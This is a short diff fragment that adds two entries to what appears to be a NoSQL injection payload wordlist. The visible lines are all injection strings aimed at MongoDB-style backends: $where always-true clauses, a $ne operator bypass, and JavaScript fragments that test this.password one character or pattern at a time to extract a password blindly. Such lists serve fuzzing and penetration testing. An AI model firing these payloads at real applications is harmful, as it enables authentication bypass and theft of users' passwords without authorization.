@@ -9,6 +9,8 @@ $where: '1 == 1'
 $WHERE: '1 == 1'
 $Where: '1 == 1'
 "{\"$ne\": \"\"}"
+'admin' && this.password[0] == 'a' || 'a'=='b'
+'admin' && this.password.match(/\d/) || 'a'=='b'
 ' && this.password.match(/.*/)//+%00
 ' && THIS.PASSWORD.MATCH(/.*/)//+%00
 ' && This.Password.Match(/.*/)//+%00
